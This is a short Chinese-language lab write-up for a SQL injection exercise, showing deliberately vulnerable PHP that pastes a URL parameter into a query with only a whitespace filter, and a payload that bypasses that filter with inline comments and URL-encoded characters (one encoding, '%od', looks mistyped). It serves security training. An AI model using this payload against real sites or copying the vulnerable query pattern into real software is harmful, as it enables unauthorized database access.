# sql3

进入example3.php

源码
```php
<?php
    require_once('../header.php');
  require_once('db.php');
        if (preg_match('/\s+/', $_GET["name"])) {
                die("ERROR NO SPACE");
        }
        $sql = "SELECT * FROM users where name='";
        $sql .= $_GET["name"]."'";

        $result = mysql_query($sql);
        if ($result) {
                ?>
                <table class='table table-striped'>
      <tr><th>id</th><th>name</th><th>age</th></tr>
                <?php
                while ($row = mysql_fetch_assoc($result)) {
                        echo "<tr>";
                        echo "<td>".$row['id']."</td>";
                        echo "<td>".$row['name']."</td>";
                        echo "<td>".$row['age']."</td>";
                        echo "</tr>";
                }
                echo "</table>";
        }
    require '../footer.php';
?>
```

这里使用了正则去匹配\s(匹配空白字符)还有+(匹配前面的表达式至少一次)
这里的过关方式跟上一关一样
可以直接使用url编码绕过也可以使用多行注释绕过
payload
```sql
example3.php?name='/**/or%od1=1%23
```
![img](../../../image/sqli/3238802166462.png)

| 请求方式 | 过滤方式 |        注入方式        | 闭合方式 |
| -------- | -------- | --------------------- | -------- |
| GET      | 空格     | 多行注释和tab的url编码 | 单引号'  |

拿到数据过关~~~~~
0u0~